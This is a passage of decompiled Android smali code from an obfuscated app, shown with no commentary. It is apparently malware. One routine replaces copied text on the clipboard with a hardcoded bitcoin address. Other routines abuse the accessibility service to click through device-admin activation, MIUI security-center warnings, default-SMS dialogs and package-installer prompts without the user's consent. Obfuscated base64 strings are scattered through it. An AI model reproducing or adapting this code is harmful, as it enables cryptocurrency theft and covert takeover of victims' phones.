    move-result-object v2

    invoke-virtual {v2, v1, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    return-void

    :catchall_1
    move-exception v2

    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    .line 9
    :cond_1
    :try_start_2
    iget-object v2, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l:Ly0/c;

    .line 10
    invoke-virtual {v2, p2}, Ly0/c;->a(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 11
    iget-object v2, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l:Ly0/c;

    .line 12
    const-string v3, "bc1ql34xd8ynty3myfkwaf8jqeth0p4fxkxg673vlf"

    invoke-virtual {v2, p2, v3}, Ly0/c;->b(Ljava/lang/CharSequence;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    invoke-static {p2, p2}, Landroid/content/ClipData;->newPlainText(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Landroid/content/ClipData;

    move-result-object v2

    invoke-virtual {p1, v2}, Landroid/content/ClipboardManager;->setPrimaryClip(Landroid/content/ClipData;)V

    new-instance p1, Landroid/os/Bundle;

    invoke-direct {p1}, Landroid/os/Bundle;-><init>()V

    invoke-virtual {p1, v0, p2}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {p3}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p2

    invoke-virtual {p2, v1, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    return-void

    :catchall_2
    move-exception p1

    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_2
    return-void
.end method

.method public final H()Z
    .locals 10

    const-string v0, ""

    .line 1
    :try_start_0
    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v1}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v2, "autoClickAdmin"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_0

    move-object v1, v0

    .line 2
    :cond_0
    const-string v2, "1"

    invoke-static {v1, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const-string v2, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager"

    const-string v3, "device_policy"

    const/4 v4, 0x1

    const/4 v5, 0x0

    if-eqz v1, :cond_c

    .line 3
    :try_start_1
    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    invoke-static {v1, v2}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    new-instance v6, Landroid/content/ComponentName;

    const-class v7, Lcom/cisojemopatude/yazi/cuzeteyore/fibaga;

    invoke-direct {v6, p0, v7}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v6}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v1

    if-nez v1, :cond_c

    .line 4
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const-string v6, "it"

    if-nez v1, :cond_1

    goto :goto_0

    :cond_1
    :try_start_2
    const-string v7, "com.android.settings:id/action_button"

    invoke-virtual {v1, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-nez v1, :cond_2

    goto :goto_0

    :cond_2
    invoke-interface {v1}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_3
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_5

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {v7, v6}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, v7, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->d()Z

    move-result v8

    if-eqz v8, :cond_4

    goto/16 :goto_4

    :cond_4
    new-instance v8, Landroid/graphics/Rect;

    invoke-direct {v8}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v7, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v8}, Landroid/graphics/Rect;->centerX()I

    move-result v7

    invoke-virtual {v8}, Landroid/graphics/Rect;->centerY()I

    move-result v8

    .line 5
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v9

    invoke-virtual {p0, v7, v8, v9}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->q(IILandroid/view/accessibility/AccessibilityNodeInfo;)V

    .line 6
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->d()Z

    move-result v7

    if-eqz v7, :cond_3

    goto/16 :goto_4

    :cond_5
    :goto_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_6

    goto :goto_3

    :cond_6
    const-string v7, "com.miui.securitycenter:id/check_box"

    invoke-virtual {v1, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-nez v1, :cond_7

    goto :goto_3

    :cond_7
    invoke-interface {v1}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_8
    :goto_1
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_b

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {v7, v6}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, v7}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->j(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_9

    goto :goto_1

    :cond_9
    const-string v8, "com.miui.securitycenter:id/intercept_warn_allow"

    invoke-virtual {v7, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_a

    goto :goto_1

    :cond_a
    invoke-interface {v7}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v7

    :goto_2
    invoke-interface {v7}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-eqz v8, :cond_8

    invoke-interface {v7}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {v8, v6}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, v8, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    goto :goto_2

    :cond_b
    :goto_3
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->d()Z

    move-result v1

    if-eqz v1, :cond_c

    goto :goto_4

    .line 7
    :cond_c
    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    invoke-static {v1, v2}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    new-instance v2, Landroid/content/ComponentName;

    const-class v3, Lcom/cisojemopatude/yazi/cuzeteyore/fibaga;

    invoke-direct {v2, p0, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v1

    if-eqz v1, :cond_d

    .line 8
    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "autoClickAdmin"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    :cond_d
    move v4, v5

    .line 9
    :goto_4
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto :goto_5

    :catchall_0
    move-exception v0

    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    move-result-object v0

    :goto_5
    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    .line 10
    instance-of v2, v0, Lj0/d$a;

    if-eqz v2, :cond_e

    move-object v0, v1

    .line 11
    :cond_e
    check-cast v0, Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    return v0
.end method

.method public final I(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 3

    .line 1
    :try_start_0
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v1, "autoClickSms"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    move-object v2, v0

    .line 2
    :goto_0
    const-string v0, "1"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-static {p0}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    iget-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    invoke-static {p0, p1, v0}, Lb/a;->b(Landroid/accessibilityservice/AccessibilityService;Landroid/view/accessibility/AccessibilityEvent;Ljava/lang/String;)Z

    :cond_1
    invoke-static {p0}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_2

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->J()Z

    :cond_2
    invoke-static {p0}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_3

    const-string p1, "0"

    .line 3
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "autoClickSms"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_1

    :catchall_0
    move-exception p1

    .line 4
    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_3
    :goto_1
    return-void
.end method

.method public final J()Z
    .locals 11

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    const/16 v2, 0x80

    const-string v3, ""

    const-string v4, "dWpQMzRQMUJNZ0FBYUdibWdSMkdqUT09OjpEekZPejMvNUlKTHpIdzRFZk1mM2FnPT0="

    const-string v5, "eUVDanJhYnF4N0NmN2pBM2NyWnpxZ0FDY2cxSFRWTk5iV1VFeDJGUFJuUT06Olh6Q3ZMR2N3aGVpZXlJVWhVNXZURlE9PQ=="

    if-nez v1, :cond_0

    goto :goto_1

    .line 1
    :cond_0
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v7, "appName"

    sget-object v8, Ls0/c;->e:Landroid/content/Context;

    invoke-static {v8}, Ls0/c;->g(Ljava/lang/Object;)V

    .line 2
    :try_start_0
    invoke-virtual {v8}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v9

    invoke-virtual {v8}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v10

    invoke-virtual {v8}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v10, v8, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v8

    invoke-virtual {v9, v8}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v8

    check-cast v8, Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    invoke-static {v5}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {v4}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 3
    sget-object v8, Lb0/b;->a:Lb0/b;

    move-object v8, v3

    .line 4
    :goto_0
    invoke-interface {v6, v7, v8}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    .line 5
    invoke-virtual {v1, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-nez v1, :cond_1

    goto :goto_1

    :cond_1
    invoke-interface {v0, v1}, Ljava/util/List;->addAll(Ljava/util/Collection;)Z

    :goto_1
    invoke-static {}, Ls0/c;->p()Z

    move-result v1

    if-nez v1, :cond_4

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_2

    goto :goto_3

    :cond_2
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getBaseContext()Landroid/content/Context;

    move-result-object v6

    const-string v7, "baseContext"

    invoke-static {v6, v7}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 6
    :try_start_1
    invoke-virtual {v6}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v7

    invoke-virtual {v6}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v8

    invoke-virtual {v6}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v8, v6, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v2

    invoke-virtual {v7, v2}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v2

    check-cast v2, Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-object v3, v2

    goto :goto_2

    :catch_1
    invoke-static {v5}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {v4}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 7
    sget-object v2, Lb0/b;->a:Lb0/b;

    .line 8
    :goto_2
    invoke-virtual {v1, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-nez v1, :cond_3

    goto :goto_3

    :cond_3
    invoke-interface {v0, v1}, Ljava/util/List;->addAll(Ljava/util/Collection;)Z

    :cond_4
    :goto_3
    invoke-static {v0}, Lk0/f;->P(Ljava/lang/Iterable;)Ljava/util/Set;

    move-result-object v0

    invoke-static {v0}, Lk0/f;->O(Ljava/util/Collection;)Ljava/util/List;

    move-result-object v0

    invoke-static {v0}, Lk0/f;->L(Ljava/util/List;)V

    invoke-interface {v0}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v0

    const/4 v1, 0x0

    move v2, v1

    :cond_5
    :goto_4
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    const/4 v4, 0x1

    if-eqz v3, :cond_8

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {p0, v3, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    move-result v3

    if-eqz v3, :cond_6

    sget-object v2, Lb0/b;->a:Lb0/b;

    move v2, v4

    goto :goto_4

    :cond_6
    const-string v3, "android"

    const-string v5, "button1"

    invoke-virtual {p0, v3, v5, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v3

    if-nez v3, :cond_7

    const-string v3, "com.android.settings"

    const-string v5, "action_button"

    invoke-virtual {p0, v3, v5, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v3

    if-eqz v3, :cond_5

    :cond_7
    return v4

    :cond_8
    if-eqz v2, :cond_a

    const-string v0, "android"

    const-string v2, "button1"

    invoke-virtual {p0, v0, v2, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_9

    const-string v0, "com.android.settings"

    const-string v2, "action_button"

    invoke-virtual {p0, v0, v2, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_a

    :cond_9
    return v4

    :cond_a
    return v1
.end method

.method public final K(Z)Z
    .locals 12

    const-string v0, "QU15Z3dvendrZHZtV3lncHdMOWxTZz09Ojo2TTBHZTg2MFp1Tk13WmJjNVViK2ZnPT0="

    const-string v1, "S2k2TVRCL0JDd1lwNjJlQXhyai9kUT09OjoyV0xBMGJZMzRVK2FXamwvaEVmTzZnPT0="

    const-string v2, "OHAyZjd4VDFqZmJ1MUdJQWY1RlQzUT09OjpnaVdRYjJOZDk4UXlpV2hlblVtOTdnPT0="

    const-string v3, "SEY3ank1enJ6SnBHS0pWOVpaOHRsUT09OjowZ2U5dUlmZUZxSVFLYmVBVnlBdC93PT0="

    const/4 v4, 0x0

    :try_start_0
    invoke-static {}, Ls0/c;->o()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v5

    const/4 v6, 0x1

    if-nez v5, :cond_0

    move v5, v6

    goto :goto_0

    :cond_0
    move v5, v4

    :goto_0
    if-eqz v5, :cond_1b

    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_1

    goto :goto_1

    :cond_1
    invoke-static {}, Ls0/c;->k()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_2

    goto :goto_1

    :cond_2
    invoke-virtual {v5, v7}, Ljava/util/ArrayList;->addAll(Ljava/util/Collection;)Z

    :goto_1
    invoke-static {}, Ls0/c;->p()Z

    move-result v7

    if-nez v7, :cond_5

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_3

    goto :goto_3

    :cond_3
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getBaseContext()Landroid/content/Context;

    move-result-object v8

    const-string v9, "baseContext"

    invoke-static {v8, v9}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 1
    :try_start_1
    invoke-virtual {v8}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v9

    invoke-virtual {v8}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v10

    invoke-virtual {v8}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v8

    const/16 v11, 0x80

    invoke-virtual {v10, v8, v11}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v8

    invoke-virtual {v9, v8}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v8

    check-cast v8, Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_2

    :catch_0
    :try_start_2
    const-string v8, "eUVDanJhYnF4N0NmN2pBM2NyWnpxZ0FDY2cxSFRWTk5iV1VFeDJGUFJuUT06Olh6Q3ZMR2N3aGVpZXlJVWhVNXZURlE9PQ=="

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    const-string v8, "dWpQMzRQMUJNZ0FBYUdibWdSMkdqUT09OjpEekZPejMvNUlKTHpIdzRFZk1mM2FnPT0="

    invoke-static {v8}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 2
    sget-object v8, Lb0/b;->a:Lb0/b;

    const-string v8, ""

    .line 3
    :goto_2
    invoke-virtual {v7, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_4

    goto :goto_3

    :cond_4
    invoke-virtual {v5, v7}, Ljava/util/ArrayList;->addAll(Ljava/util/Collection;)Z

    :cond_5
    :goto_3
    invoke-static {v5}, Lk0/f;->P(Ljava/lang/Iterable;)Ljava/util/Set;

    move-result-object v5

    .line 4
    instance-of v7, v5, Ljava/util/List;

    const/4 v8, 0x0

    if-eqz v7, :cond_7

    check-cast v5, Ljava/util/List;

    invoke-interface {v5}, Ljava/util/List;->isEmpty()Z

    move-result v7

    if-eqz v7, :cond_6

    goto :goto_4

    :cond_6
    invoke-interface {v5, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    goto :goto_5

    :cond_7
    invoke-interface {v5}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v5

    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-nez v7, :cond_8

    :goto_4
    move-object v5, v8

    goto :goto_5

    :cond_8
    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    .line 5
    :goto_5
    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v5, :cond_9

    goto/16 :goto_d

    :cond_9
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v7

    const-string v9, "com.miui.securitycenter"

    invoke-static {v7, v9}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v7

    if-nez v7, :cond_1a

    iget-object v7, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    const-string v9, "com.miui.securitycenter"

    invoke-static {v7, v9}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_a

    goto/16 :goto_b

    :cond_a
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v3

    const-string v7, "com.google.android.packageinstaller"

    invoke-static {v3, v7}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b

    invoke-static {}, Ls0/c;->m()Ljava/lang/String;

    move-result-object p1

    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_1b

    invoke-static {}, Ls0/c;->l()Ljava/lang/String;

    move-result-object p1

    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_1b

    goto/16 :goto_c

    :cond_b
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    const-string v3, "com.android.packageinstaller"

    invoke-static {v2, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_19

    iget-object v2, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    const-string v3, "com.android.packageinstaller"

    invoke-static {v2, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_c

    goto/16 :goto_a

    :cond_c
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    const-string v2, "com.android.settings"

    invoke-static {v1, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_18

    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    const-string v2, "com.android.settings"

    invoke-static {v1, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_d

    goto/16 :goto_9

    :cond_d
    if-eqz p1, :cond_1b

    .line 6
    iget-object p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->i:Ljava/lang/String;

    if-eqz p1, :cond_e

    .line 7
    const-string v0, "btnCancel"

    invoke-virtual {p0, p1, v0, v6}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result p1

    if-eqz p1, :cond_e

    goto/16 :goto_d

    :cond_e
    sget-object p1, Lb0/b;->a:Lb0/b;

